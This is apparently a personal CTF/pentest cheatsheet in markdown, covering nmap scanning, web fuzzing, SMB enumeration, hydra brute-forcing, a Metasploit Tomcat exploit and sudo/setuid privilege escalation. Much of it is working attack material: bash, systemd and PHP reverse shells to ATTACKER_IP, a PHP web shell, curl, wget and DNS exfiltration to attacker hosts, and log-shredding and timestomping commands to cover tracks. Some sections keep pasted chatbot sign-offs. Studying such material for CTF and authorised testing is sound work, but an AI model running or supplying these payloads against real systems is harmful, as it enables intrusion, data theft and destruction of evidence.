# Boot2Root Cheatsheet


## **Enumeration**

<details>
  <summary>
    
### Nmap Network Scanning

  </summary>

```nmap -A -sC -sV -oN nmap.txt IP```


## Most Common Commands for Pentesters & Bug Hunters
- **Full Network Recon (Aggressive Scan with OS & Version Detection):**
  ```bash
  nmap -A -T4 192.168.1.1
  ```
- **Quick Scan of Most Common Ports:**
  ```bash
  nmap -F 192.168.1.1
  ```
- **Full Port Scan + Service Detection:**
  ```bash
  nmap -p- -sV 192.168.1.1
  ```
- **Detect Live Hosts in a Network:**
  ```bash
  nmap -sn 192.168.1.0/24
  ```
- **Scan for Vulnerabilities (NSE Scripts):**
  ```bash
  nmap --script vuln 192.168.1.1
  ```
- **Bypass Firewall & Stealth Scan:**
  ```bash
  nmap -sS -T3 -D RND:10 192.168.1.1
  ```

## Basic Scans
- **Scan a single target:**  
  `nmap 192.168.1.1`
- **Scan multiple targets:**  
  `nmap 192.168.1.1 192.168.1.2`
- **Scan an entire subnet:**  
  `nmap 192.168.1.0/24`
- **Scan from a file list:**  
  `nmap -iL targets.txt`
- **No ping scan (for firewalled hosts):**  
  `nmap -Pn 192.168.1.1`

## Port Scanning
- **Scan all 65,535 ports:**  
  `nmap -p- 192.168.1.1`
- **Scan specific ports:**  
  `nmap -p 22,80,443 192.168.1.1`
- **Scan a port range:**  
  `nmap -p 1-1000 192.168.1.1`
- **Scan top 1000 most common ports:**  
  `nmap --top-ports 1000 192.168.1.1`

## Scan Techniques
- **TCP SYN scan (stealthy, default for root):**  
  `nmap -sS 192.168.1.1`
- **TCP Connect scan (for non-root users):**  
  `nmap -sT 192.168.1.1`
- **UDP scan:**  
  `nmap -sU 192.168.1.1`
- **Aggressive scan (OS, versions, scripts, traceroute):**  
  `nmap -A 192.168.1.1`
- **Scan with OS detection:**  
  `nmap -O 192.168.1.1`

## Service & Version Detection
- **Detect running services & versions:**  
  `nmap -sV 192.168.1.1`
- **Aggressive version detection:**  
  `nmap -sV --version-intensity 5 192.168.1.1`

## Firewall Evasion & Stealth
- **Change scan timing (1-5, slow to fast):**  
  `nmap -T4 192.168.1.1`
- **Use decoys to hide real IP:**  
  `nmap -D RND:10 192.168.1.1`
- **Spoof source IP:**  
  `nmap -S 192.168.1.100 192.168.1.1`
- **Fragment packets to bypass filters:**  
  `nmap -f 192.168.1.1`
- **Use a custom MAC address:**  
  `nmap --spoof-mac 00:11:22:33:44:55 192.168.1.1`

## Nmap Scripting Engine (NSE)
- **List available scripts:**  
  `nmap --script-help=default`
- **Scan for vulnerabilities:**  
  `nmap --script vuln 192.168.1.1`
- **Scan for common exploits:**  
  `nmap --script exploit 192.168.1.1`
- **Scan for web vulnerabilities:**  
  `nmap --script=http-vuln* 192.168.1.1`
- **Detect open directories:**  
  `nmap --script http-enum 192.168.1.1`

## Saving & Exporting Scan Results
- **Save results in normal text format:**  
  `nmap -oN scan.txt 192.168.1.1`
- **Save results in XML format:**  
  `nmap -oX scan.xml 192.168.1.1`
- **Save results in all formats:**  
  `nmap -oA scan_results 192.168.1.1`
- **View output in grep-friendly format:**  
  `nmap -oG scan.gnmap 192.168.1.1`

## Specialized Scans
- **Scan for live hosts only:**  
  `nmap -sn 192.168.1.0/24`
- **Detect SMB vulnerabilities:**  
  `nmap --script smb-vuln* -p 445 192.168.1.1`
- **Enumerate SNMP information:**  
  `nmap -sU -p 161 --script=snmp-info 192.168.1.1`
- **Brute-force FTP login:**  
  `nmap --script=ftp-brute -p 21 192.168.1.1`



</details>






<details>
  <summary>

  ### Common Ports and Vulnerabilities Cheat Sheet

  </summary>

## Port Ranges
- **Well-Known Ports (0-1023):** Reserved for system processes and well-known services.
- **Registered Ports (1024-49151):** Assigned by IANA for user applications.
- **Dynamic/Private Ports (49152-65535):** Used for temporary or custom connections.

## Commonly Used Ports & Associated Services
| Port | Service | Description | Common Vulnerabilities |
|------|---------|-------------|------------------------|
| 21   | FTP     | File Transfer Protocol | Anonymous login, brute-force attacks, clear-text transmission |
| 22   | SSH     | Secure Shell | Weak credentials, outdated versions, brute-force |
| 23   | Telnet  | Unencrypted Remote Login | Clear-text transmission, credential theft |
| 25   | SMTP    | Simple Mail Transfer Protocol | Open relays, spam abuse |
| 53   | DNS     | Domain Name System | DNS spoofing, cache poisoning, amplification attacks |
| 80   | HTTP    | Web Traffic | XSS, SQL Injection, Directory Traversal |
| 110  | POP3    | Email Retrieval | Clear-text credentials, brute-force |
| 135  | RPC     | Remote Procedure Call | DCOM/RPC exploits, lateral movement |
| 139  | NetBIOS | Windows File Sharing | SMB relay attacks, enumeration |
| 143  | IMAP    | Internet Message Access Protocol | Brute-force, credential leaks |
| 443  | HTTPS   | Secure Web Traffic | SSL vulnerabilities (Heartbleed, TLS downgrade) |
| 445  | SMB     | Windows File Sharing | EternalBlue, SMBGhost, WannaCry |
| 3306 | MySQL   | Database | SQL injection, weak credentials |
| 3389 | RDP     | Remote Desktop Protocol | Brute-force, BlueKeep exploit |

## Common Vulnerabilities by Service Type
### Web Services (80, 443)
- SQL Injection
- Cross-Site Scripting (XSS)
- Directory Traversal
- Remote Code Execution (RCE)

### File Transfer & Sharing (21, 139, 445)
- Anonymous authentication
- SMB relay attack
- Ransomware infection via SMB vulnerabilities

### Email Services (25, 110, 143)
- Open relay abuse
- Phishing & spoofing attacks
- Credential brute-forcing

### Remote Access (22, 23, 3389)
- Weak authentication
- Brute-force attacks
- Man-in-the-middle (MITM) attacks

</details>

























<details>
  <summary>


  ### Find Directories 
  </summary>

# Finding Web Directories - Cheat Sheet

### 1. **Using `gobuster`**
- **Basic command:**
  ```bash
  gobuster dir -u http://10.10.195.158 -w /home/iftx/Desktop/Hacking/Recon/wordlist/common.txt
  ```

### 2. **Using `ffuf` (Fuzz Faster U Fool)**
- **Basic command:**

```bash
  ffuf -u http://10.10.195.158/FUZZ -w /home/iftx/Desktop/Hacking/Recon/wordlist/common.txt
  ```

```bash
  ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt -t 5 -p 0.5 -e .php,.html,.txt -fc 403,404

 ```




### 3. **Using `dirb` (Directory Buster)**
- **Basic command:**
  ```bash
  dirb http://10.10.195.158 /home/iftx/Desktop/Hacking/Recon/wordlist/common.txt
  ```

### 4. **Using `nikto` for Web Scanning**
- **Basic command:**
  ```bash
  nikto -h http://10.10.195.158
  ```

### 5. **Using `wfuzz` (Web Fuzzer)**
- **Basic command:**
  ```bash
  wfuzz -c -z file,/home/iftx/Desktop/Hacking/Recon/wordlist/common.txt -u http://10.10.195.158/FUZZ
  ```

### 6. **Using Nmap with `http-enum` Script**
- **Command:**
  ```bash
  nmap --script http-enum -p 80 10.10.195.158
  ```



</details>

## Web Exploitation

<details>
  <summary>

  ### **SMB Enumeration Cheat Sheet**
    
  </summary>


#### **1️⃣ Nmap SMB Enumeration**
```bash
nmap --script smb-enum-shares,smb-enum-users -p 139,445 <target-IP>
```
- Enumerates **SMB users & shares**.

```bash
nmap --script smb-vuln* -p 139,445 <target-IP>
```
- Checks **SMB vulnerabilities**.

---

#### **2️⃣ smbclient - Access SMB Shares**
```bash
smbclient -L //<target-IP> -U ""
```
- Lists available shares **without authentication**.

```bash
smbclient //<target-IP>/share -U user
```
- Connects to a **specific share**.

---

#### **3️⃣ smbmap - Check Share Access**
```bash
smbmap -H <target-IP>
```
- Checks **read/write access**.

```bash
smbmap -H <target-IP> -R
```
- Recursively **lists all files**.

---

#### **4️⃣ CrackMapExec (CME) - SMB Enumeration**
```bash
cme smb <target-IP> --shares
```
- Lists **shared folders**.

```bash
cme smb <target-IP> -u user -p password --shares
```
- Enumerates shares **with credentials**.

---

#### **5️⃣ Enum4linux - SMB Enumeration**
```bash
enum4linux -a <target-IP>
```
- Performs **all** enumeration techniques.

```bash
enum4linux -U <target-IP>   # List users  
enum4linux -S <target-IP>   # List shared folders  
```

---

#### **6️⃣ rpcclient - Windows RPC Services**
```bash
rpcclient -U "" <target-IP>
```
- Connects to **SMB RPC services** without authentication.

```bash
rpcclient -U user <target-IP>
> enumdomusers
```
- Enumerates **domain users**.

---

### ✅ **Best SMB Enumeration Workflow**
1️⃣ **Check open SMB ports** → `nmap -p 139,445 <IP>`  
2️⃣ **Enumerate shares & users** → `nmap --script smb-enum-shares,smb-enum-users -p 139,445 <IP>`  
3️⃣ **Try accessing shares** → `smbclient -L //<IP> -U ""`  
4️⃣ **Check permissions** → `smbmap -H <IP>`  
5️⃣ **Look for vulnerabilities** → `nmap --script smb-vuln* -p 139,445 <IP>`  

🚀 **Use these tools responsibly for pentesting & bug bounty engagements!**


</details>








<details>
<summary>
  
  ### **Login bruteforcing**

</summary>

**Brute-Forcing SquirrelMail Login**


Hydra Command:
```bash
hydra -l milesdyson -P log1.txt 10.10.195.158 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=SquirrelMail - Unknown user or password incorrect" -V -F
```
Medusa Command:
```bash
medusa -h 10.10.195.158 -u milesdyson -P log1.txt -M http -m POST:/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1
```
Both tools brute-force the login for SquirrelMail using a username (milesdyson) and a password list (log1.txt) to find the correct credentials.




 ### **ssh server**
```bash
hydra -l user_ name -P /home/iftx/Desktop/Room/wordlist/rockyou.txt 10.10.181.27 ssh

```
  
</details>


## Metasploit

<details>
  <summary>
   Metasploit Exploitation (Ghostcat - CVE-2020-1938)

  </summary>

1. Launch Metasploit

 `msfconsole`

2. Search for AJP Exploits

   `msf6 > search ajp`
   
```
Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/multi/http/tomcat_jsp_upload_bypass  2020-02-24       excellent  Yes    Tomcat RCE via JSP Upload Bypass
```
3. Select and Configure the Exploit

   `msf6 > use 0 `
   

`msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > show options`


```
Module options (exploit/multi/http/tomcat_jsp_upload_bypass):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s)
   RPORT      8080             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path
   VHOST                       no        HTTP server virtual host
```


`msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > set RHOSTS 10.10.228.82`


`msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > set RPORT 8009`


`msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > run`


skyfuck:8730281lkjlkjdqlksalks


  
</details>


## Privilege Escalation


<details>
  <summary>

  
  ### Privilege Escalation via Sudo Vi (CVE-2019-14287)
  
  </summary>
  
### **1. Checking Sudo Permissions**
Ran `sudo -l` and found:
```bash
User gwendoline may run: (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```
→ **Vi can be executed as any user except root** (`!root`) without a password.

---

### **2. Exploiting Vi to Gain Root Shell**
#### **Method 1: User ID Manipulation (CVE-2019-14287)**
```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```
- **Why it works**:  
  `-u#-1` triggers an integer underflow, resolving to **UID 0 (root)** despite `!root` restriction.

#### **Method 2: Vi Shell Escape**
Inside Vi:
```vim
:!/bin/bash
```
→ Spawns a **root shell** (GTFOBins technique).

---

### **3. Why This Works**
| Vulnerability | Impact | Tool Reference |
|--------------|--------|----------------|
| **CVE-2019-14287** | Bypasses `!root` restriction via `-u#-1` trick | [Sudo Security Advisory](https://www.sudo.ws/alerts/unescape_overflow.html) |
| **Vi Shell Escape** | Arbitrary command execution as root | [GTFOBins: vi](https://gtfobins.github.io/gtfobins/vi/) |
| **NOPASSWD Misconfiguration** | No password required for escalation | |

---

### **4. Mitigation**
1. **Update Sudo**: Patch to version **1.8.28+** to fix CVE-2019-14287.
2. **Restrict Sudoers**:
   ```bash
   # Replace:
   (ALL, !root) NOPASSWD: /usr/bin/vi
   # With:
   (gwendoline) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
   ```
3. **Audit**: Regularly run `sudo -l` for all users.

---

### **5. Impact: Critical (Root Access)**
- **Proof of Concept**:
  ```bash
  whoami  # Output: root
  cat /root/root.txt
  ```

</details>

<details>
  <summary>
    
### Privilege Escalation via `sudo wget` Exploitation
    
  </summary>


#### **1. Checking Sudo Permissions**  
- Ran `sudo -l` and found:  
  ```bash
  User jessie may run: (root) NOPASSWD: /usr/bin/wget
  ```
  → **`wget` can be executed as root without a password.**  

#### **2. Exploiting `wget` to Read Root Files**  
- **Method 1**: Directly read `/root/root_flag.txt`:  
  ```bash
  sudo wget -i /root/root_flag.txt  # Uses `-i` to read the file
  ```
- **Method 2**: Exfiltrate the file via HTTP (if `-i` fails):  
  ```bash
  sudo wget --post-file=/root/root_flag.txt http://ATTACKER_IP:8000
  ```
  → **Check HTTP server logs for the flag.**  

#### **3. Why This Works**  
- **GTFOBins**: `wget` with `sudo` can read arbitrary files (`-i` or `--post-file`).  
- **No Password**: `NOPASSWD` allows privilege escalation without authentication.  

#### **4. Mitigation**  
- **Restrict `sudo`**: Avoid `NOPASSWD` for commands like `wget`.  
- **Audit**: Regularly check `sudo -l` for all users.  

**Impact**: Critical (root access via file read/write).  
**Tool Reference**: [GTFOBins: wget](https://gtfobins.github.io/gtfobins/wget/).  

--- 

**Next Steps**:  
- Try **writing files** (e.g., `/etc/sudoers`) for a full root shell.  
- Use `sudo wget` to fetch and execute a reverse shell script.  

Need a deeper exploit? Let me know! 🔥
</details>

<details>
  <summary>

    
  ### Privilege Escalation via Misconfigured setuid Binary (systemctl)
    
  </summary>



## Exploit Steps

1. Find setuid binaries owned by root:

```bash
find / -user root -perm -4000 -print 2>/dev/null

```
If /bin/systemctl has setuid, it can be abused.

2. Create a malicious service (root.service):

```
ini
Copy
[Unit]
Description=root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'

[Install]
WantedBy=multi-user.target

```

3. Host the service & transfer to target:
Start HTTP server:

```python -m http.server 80```
On target, download:


```wget http://ATTACKER_IP/root.service -O /tmp/root.service```

4. Enable & start the service:
```
systemctl enable /tmp/root.service  # Uses setuid to gain root
systemctl start root

```

5. Get root shell:
Attacker listens:

```
nc -lvnp PORT
```
Service executes reverse shell as root.

### Mitigation
Remove setuid from systemctl:


chmod u-s /bin/systemctl
Restrict service file creation in /tmp (use noexec)

Monitor for unusual service activations

</details>


## Shell
<details>
  <summary>
    
### Automated File Reading with find + while Loop

  </summary>

If cat is disabled but you have bash or sh, you can read all files recursively:

```bash
find / -type f -name "*.txt" -exec sh -c 'echo "File: {}"; while IFS= read -r line; do echo "$line"; done < {}' \; 2>/dev/null
```
This will list and print all .txt files on the system.

Modify -name "*.txt" to target other extensions (e.g., *.php, *.bak).
</details>

<details>
  <summary>

    
  ### **Ultimate Linux Post-Exploitation & Flag Hunting Guide**  

  </summary>


---

*(CTF | Bug Bounty | Pentest | Red Team)*  

## **🔍 1. Finding Flags/Sensitive Files**  
### **A. Quick File Searches**
```bash
# Find flags by name/extension  
find / -type f \( -name "*flag*" -o -name "*.txt" -o -name "*.conf" \) 2>/dev/null  

# Find recently modified files (last 24h)  
find / -type f -mtime -1 2>/dev/null  

# Find hidden files  
find / -name ".*" -ls 2>/dev/null  
```

### **B. Content Hunting (Passwords, API Keys)**
```bash
# Search for common patterns  
grep -rniE "password|api[_-]?key|jwt|secret|flag{" /etc /home /var/www 2>/dev/null  

# Database credentials  
grep -rni "mysql://\|postgresql://" / 2>/dev/null  
```

### **C. Critical Paths**
| Path                 | Purpose                          |
|----------------------|----------------------------------|
| `/home/*/.ssh/`      | SSH private keys                 |
| `/var/www/html/`     | Web app configs (Bug Bounty)     |
| `/etc/shadow`        | Password hashes (Pentest)        |
| `/opt/backups/`      | Database/config backups          |

---

## **🚫 2. Bypassing Restrictions**  
### **A. Read Files Without `cat`**
```bash
# Basic alternatives  
less /path/file      # Interactive  
tail -n 50 /path/file  # Last 50 lines  

# Scripting  
python3 -c "print(open('/etc/passwd').read())"  
perl -pe 'print' /path/file  

# Binary/encoded  
strings /path/file   # Extract text  
base64 /path/file | base64 -d  # Encode→Decode  
```

### **B. Wildcard Bypass**
```bash
/bin/?at /path/file   # Tries /bin/cat, /bin/bat  
```

### **C. Stealthy Exfiltration**
```bash
# DNS (Attacker: `sudo tcpdump -i eth0 udp port 53`)  
xxd -p /path/file | while read line; do dig "$line.domain.com"; done  

# HTTP (Quick)  
curl -X POST --data-binary @/path/file http://attacker.com  
```

---

## **🛠️ 3. Privilege Escalation**  
### **A. Quick Checks**
```bash
# Sudo abuse  
sudo -l  # Check ALL/NOPASSWD  

# SUID/SGID binaries  
find / -perm -4000 -o -perm -2000 2>/dev/null  

# Writable cron jobs  
ls -la /etc/cron* /var/spool/cron  
```

### **B. Kernel Exploits**
```bash
uname -a  # Check version  
searchsploit linux kernel 5.4.0  # Find exploits  
```

### **C. Automated Tools**
```bash
# LinPEAS (Full audit)  
curl -L https://linpeas.sh | sh  

# LinEnum (Quick enum)  
./LinEnum.sh -t  
```

---

## **📜 4. Decoding Data**  
```bash
# Base64  
echo "RkxBR3tleGFtcGxlfQ==" | base64 -d  

# Hex  
echo "464C4147" | xxd -r -p  

# ROT13  
echo "SYNT" | tr 'A-Za-z' 'N-ZA-Mn-za-m'  
```

---

## **🚪 5. Shell Escape**  
```bash
# Spawn TTY shell  
python3 -c 'import pty; pty.spawn("/bin/bash")'  

# Reverse shell  
bash -c 'bash -i >& /dev/tcp/10.0.0.1/443 0>&1'  
```

---

## **🧹 6. Covering Tracks**  
```bash
# Clear logs  
shred -u /var/log/auth.log  

# Timestomp  
touch -r /etc/passwd /root/.bash_history  
```

---

## **🎯 Pro Tips**  
- **CTFs**: Check `/tmp/`, `/opt/`, and home directories.  
- **Bug Bounty**: Hunt for `.env`, `config.php.bak`.  
- **Pentest**: Always check `sudo -l` and SUID binaries first.  

---

### **📥 One-Pager Cheatsheet**  
```markdown
1. Find flags: `find / -name "*flag*" 2>/dev/null`  
2. Read files: `less /path/file` or `python3 -c "print(open('f').read())"`  
3. PrivEsc: `sudo -l`, `find / -perm -4000`  
4. Decode: `echo "BASE64" | base64 -d`  
5. Shell: `python3 -c 'import pty; pty.spawn("/bin/bash")'`  
```


</details>


<details>
  <summary>

  ### Detailed Guide: RSA Private Key 

  </summary>


## **1. Introduction to RSA Private Keys**
An **RSA private key** is a cryptographic key used for secure authentication, typically in SSH, SSL/TLS, and encrypted communications. If exposed, it can lead to **unauthorized system access**, making it a critical finding in security assessments.

### **Key Characteristics**
- **Format**: PEM (Base64-encoded, with `-----BEGIN RSA PRIVATE KEY-----` header).
- **Usage**: SSH logins, decrypting data, or signing certificates.
- **Common Locations**:
  - Web server leaks (`/id_rsa`, `/backup/id_rsa.bak`).
  - Git repository exposures (`.git/config`, `~/.ssh/`).
  - Misconfigured cloud storage (AWS S3, GCP buckets).

---

## **2. Exploitation in Penetration Testing**
### **Step 1: Identify & Validate the Key**
- **Check if the key is valid**:
  ```bash
  openssl rsa -in id_rsa -check
  ```
- **If passphrase-protected**, crack it using:
  ```bash
  ssh2john id_rsa > id_rsa.hash  
  john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
  ```

### **Step 2: Use the Key for SSH Access**
- **Restrict permissions** (SSH requires strict file modes):
  ```bash
  chmod 600 id_rsa
  ```
- **Attempt SSH login**:
  ```bash
  ssh -i id_rsa user@target_ip
  ```
- **Common Usernames** (if unknown):
  ```bash
  for user in $(cat users.txt); do ssh -i id_rsa $user@target_ip -o ConnectTimeout=2; done
  ```

### **Step 3: Privilege Escalation**
- Check `sudo -l` for misconfigurations (as in your `wget` case).
- Look for **writable cron jobs**, **SUID binaries**, or **kernel exploits**.

---

## **3. Bug Bounty Implications**
### **Where to Find Exposed Keys**
- **GitHub/GitLab Repos**: Search for `-----BEGIN RSA PRIVATE KEY-----`.
- **Exposed Backups**: `/backup`, `/www/backup`, `.bak` files.
- **Logs & Environment Variables**: Check `/proc/self/environ`, error logs.

### **Impact**
- **Critical Severity**: Unauthorized server access → data breaches.
- **Report Template**:
  ```
  Title: Exposed RSA Private Key Leading to Server Compromise  
  Description: A private SSH key was found at [URL], allowing unauthorized access to [service].  
  Proof: [Attach key + successful SSH login screenshot]  
  Remediation: Revoke the key, enforce key rotation, disable passwordless auth.  
  ```

---

## **4. CTF-Specific Techniques**
### **Common CTF Challenges**
1. **Hidden Key in Web Source**  
   - Use `curl` or `view-source:` to find keys in HTML comments.
2. **Steganography in Images**  
   - Extract keys using `steghide`, `binwalk`, or `strings`.
3. **Abusing Weak Permissions**  
   - If you get a low-priv shell, check `/home/*/.ssh/` for keys.

### **Automated Tools**
- **TruffleHog**: Scans Git repos for secrets.
- **GitLeaks**: Detects exposed keys in version control.
- **ssh-audit**: Checks SSH server vulnerabilities.

---

## **5. Defensive Measures (For Admins)**
### **Preventing Key Leaks**
- **Never store keys in web directories**.
- **Use SSH certificates** instead of raw keys.
- **Rotate keys periodically** and revoke compromised ones.

### **Hardening SSH**
```ini
# /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys
```

---

## **6. Legal & Ethical Considerations**
- **Penetration Testing**: Only test authorized systems.
- **Bug Bounty**: Follow the program’s rules (don’t exfiltrate data).
- **CTFs**: Keys are intentionally placed—don’t attack real systems.

---

## **7. Conclusion**
- **Pentest**: Use exposed keys for initial access → escalate privileges.
- **Bug Bounty**: Report exposed keys immediately (critical finding).
- **CTF**: Often a shortcut to flags—check backups, source code, and logs.

### **Final Command Cheatsheet**
```bash
# Test key validity
openssl rsa -in id_rsa -check

# Crack passphrase-protected key
ssh2john id_rsa > hash && john --wordlist=rockyou.txt hash

# SSH login attempt
chmod 600 id_rsa && ssh -i id_rsa user@target
```

</details>

<details>
  <summary>

  ### Advanced PHP Reverse Shells & TTY Stabilization

  </summary>



---

*(Pentest/Bug Bounty/CTF Field Manual)*  

## **1. PHP Reverse Shell Techniques**
### **A. Basic Reverse Shell (One-Liner)**
```bash
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```
**Why Use This?**  
- Minimal footprint, works on most PHP-enabled systems  
- Bypasses restrictive environments where full shells are blocked  

### **B. Advanced Proc_Open Variant**
```bash
php -r '$sock=fsockopen("10.0.0.1",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```
**Advantages:**  
- More reliable for complex interactions  
- Better handling of I/O streams  

### **C. Web Shell Integration**
```php
<?php system($_GET['cmd']); ?>
```
**Deployment:**  
1. Upload to vulnerable web directory (e.g., `/uploads/shell.php`)  
2. Execute commands via:  
   ```http
   http://target.com/uploads/shell.php?cmd=whoami
   ```

---

## **2. Listener Configuration**
### **Netcat (Basic)**
```bash
nc -nvlp 4444
```
**Pro Tip:** Use `-v` for verbose mode to confirm connections.

### **Multi-Handler (Recommended)**
```bash
# In Metasploit:
msf6 > use multi/handler
msf6 > set payload php/reverse_php
msf6 > set LHOST YOUR_IP
msf6 > set LPORT 4444
msf6 > exploit
```
**Benefits:**  
- Auto-handles session restoration if disconnected  
- Built-in logging  

---

## **3. TTY Stabilization Methods**
### **A. Python (Gold Standard)**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
**Follow-up:**  
```bash
CTRL+Z  # Background the shell
stty raw -echo; fg  # Enable raw mode
export TERM=xterm  # Enable full terminal features
```

### **B. Alternatives When Python Unavailable**
| Command | Use Case |
|---------|----------|
| `script -qc /bin/bash /dev/null` | Systems with `script` binary |
| `socat exec:'bash -li' pty,stderr,setsid,sigint,sane` | Requires socat installation |
| `perl -e 'exec "/bin/bash";'` | Perl-based systems |

### **C. Full Upgrade Sequence**
1. Spawn TTY  
2. Set terminal type:  
   ```bash
   export TERM=xterm-256color
   ```
3. Fix stty:  
   ```bash
   stty rows 55 columns 238  # Adjust to your terminal size
   ```

---

## **4. OPSEC Considerations**
### **A. Clean Execution**
```bash
# Disable history in current session
unset HISTFILE
```

### **B. Log Evasion**
```bash
# Overwrite PHP error logs after exploit
echo "" > /var/log/apache2/error.log
```

### **C. Traffic Obfuscation**
```bash
# Encrypted reverse shell (OpenSSL)
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_IP:4444 > /tmp/s; rm /tmp/s
```

---

## **5. Troubleshooting Guide**
| Issue | Solution |
|-------|----------|
| **Shell dies immediately** | Use `while true; do nc -lvp 4444; done` on listener |
| **No Python/socat** | Try `awk 'BEGIN {system("/bin/bash")}'` |
| **Firewall blocking** | Use common ports (80, 443) or ICMP/DNS tunneling |

---

## **6. Real-World Applications**
### **Bug Bounty**  
- Use in blind RCE scenarios (e.g., Log4j exploits)  
- Combine with SSRF to pivot internally  

### **CTF Challenges**  
- Bypass restricted shells via PHP wrappers:  
  ```bash
  php -r "include('data://text/plain,<?php system(\$_GET[\"cmd\"]) ?>');"
  ```

### **Pentest Engagements**  
- Chain with credential theft:  
  ```bash
  php -r 'echo file_get_contents("/etc/passwd");'
  ```

---

## **7. Reference Cheatsheet**
```markdown
1. Start Listener:    `nc -nvlp 4444`
2. PHP Shell:        `php -r '$s=fsockopen("IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`
3. Stabilize:        `python3 -c 'import pty; pty.spawn("/bin/bash")'`
4. Full Upgrade:     `export TERM=xterm; stty raw -echo; fg`
```

---

**Pro Tip:** Bookmark this guide and save the cheatsheet as `shells.txt` in your toolkit. For a **PDF version** with clickable TOC, reply "PDF please"!  

Need Windows reverse shell equivalents? Let me know. 🚀
</details>
